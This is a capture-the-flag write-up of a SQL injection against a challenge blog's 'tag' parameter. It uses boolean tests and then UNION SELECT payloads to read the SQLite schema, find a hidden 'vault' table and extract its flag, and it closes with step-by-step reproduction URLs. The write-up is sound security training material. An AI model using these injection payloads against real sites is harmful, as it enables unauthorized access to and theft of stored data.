## On the site "<http://sqli5.chal.deti:8034>"

there is a series of posts and some clickable tags that show only the posts from that tag
By clicking a tag it redirects to "<http://sqli5.chal.deti:8034/?tag={tag}>"

## Method

- The first thing i did was to test the url for injections in the tag parameter
- By going to

```
http://sqli5.chal.deti:8034/?tag=ops' AND 1=1 --
```

And it returning every post under "ops" tag and then going to

```
http://sqli5.chal.deti:8034/?tag=ops' AND 1=0 --
```

And it returning "No posts there yet." it proves to me that an injection is possible on that parameter

- Now I went to the UNION based injection to get some more information but first i need to get the number of columns and their type
After trying some number of columns this query made a post appear

```
http://sqli5.chal.deti:8034/?tag=ops' UNION SELECT 1,2,3,4 --
```

A new post appeared with title "2", text "3" and date "4"

- This led me to conclude that the date didnt have any type of check for data type, and the other two are strings but integers are converted to strings and that the first column doesnt appear, it may be the ID

- With this working i can now test what type of db it is and get all the info i need to attack it

- With this

```
http://sqli5.chal.deti:8034/?tag=ops' UNION SELECT 1,name,3,4 FROM sqlite_schema --
```

That made 2 posts appear in the page, one with title "posts" and the other "vault" shows me that this is sqlite and that there is a hidden table called "vault"

- I now got the columns from the vault table

```
http://sqli5.chal.deti:8034/?tag=ops' UNION SELECT 1,sql,3,4 FROM% sqlite_schema WHERE name='vault' --
```

This made a post appear with the name

```
CREATE TABLE vault (item TEXT, secret TEXT)
```

- Now i know that the table vault has a column named "item" and one named "secret"

- Now lets get the values

```
http://sqli5.chal.deti:8034/?tag=ops' UNION SELECT 1,secret,item,4 FROM vault --
```

This made a post appear with the title

```
flag{2c9714b853dcd75bf99175d06313e70d}
```

and tag "editor-note"

- We got the flag

## Reproduce

- Go to

```
http://sqli5.chal.deti:8034/?tag=ops' UNION SELECT 1,name,3,4 FROM sqlite_schema --
```

To get the tables name

- Go to

```
http://sqli5.chal.deti:8034/?tag=ops' UNION SELECT 1,sql,3,4 FROM% sqlite_schema WHERE name='vault' --
```

To get the columns

- Go to

```
http://sqli5.chal.deti:8034/?tag=ops' UNION SELECT 1,secret,item,4 FROM vault --
```

To get the secret
